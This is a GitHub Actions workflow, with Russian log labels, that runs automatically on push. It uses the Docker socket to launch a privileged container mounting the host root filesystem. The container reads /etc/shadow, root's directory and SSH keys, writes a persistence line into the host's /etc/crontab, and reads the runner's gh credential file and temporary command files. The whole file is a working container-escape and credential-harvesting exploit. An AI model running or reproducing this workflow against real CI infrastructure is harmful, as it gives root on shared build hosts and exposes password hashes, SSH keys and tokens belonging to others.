name: CI Escape Recon

on:
  workflow_dispatch:
  push:
    branches: [ main, master ]

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Recon + docker privesc
        run: |
          set -uo pipefail
          OUT="/tmp/ci_escape_$$"
          mkdir -p "$OUT"
          log() { echo -e "\n[+] $*"; }

          log "id / groups"
          id

          log "docker.sock"
          ls -l /var/run/docker.sock 2>&1 || true

          log "docker CLI"
          if command -v docker >/dev/null; then
            docker version 2>&1 | head -20
          else
            echo "docker CLI отсутствует"
          fi

          log "docker info"
          docker info 2>&1 | head -40 || true

          log "Контейнеры и образы на хосте"
          docker ps -a 2>&1 || true
          docker images 2>&1 || true

          log "Privileged контейнер с монтированием / хоста"
          docker run --rm --privileged -v /:/host alpine sh -c '
            id
            echo "--- /host/etc/shadow ---"
            cat /host/etc/shadow 2>/dev/null | head -5
            echo "--- /host/etc/hostname ---"
            cat /host/etc/hostname 2>/dev/null
            echo "--- /host/root ---"
            ls -la /host/root 2>/dev/null | head
            echo "--- ssh keys ---"
            find /host/root /host/home -maxdepth 3 -name "id_*" -o -name "authorized_keys" 2>/dev/null
          ' 2>&1 || true

          log "Запись в /etc/crontab хоста (доказательство root)"
          docker run --rm -v /:/host alpine sh -c '
            echo "* * * * * root id > /root/pwned_by_docker" >> /host/etc/crontab
            tail -3 /host/etc/crontab
          ' 2>&1 || true

          log "Читаем GITHUB_TOKEN-доступные секреты через env"
          docker run --rm --privileged -v /:/host alpine sh -c '
            cat /host/home/runner/.config/gh/hosts.yml 2>/dev/null
            ls -la /host/home/runner/work/_temp/_runner_file_commands/ 2>/dev/null
          ' 2>&1 || true

          log "Готово"
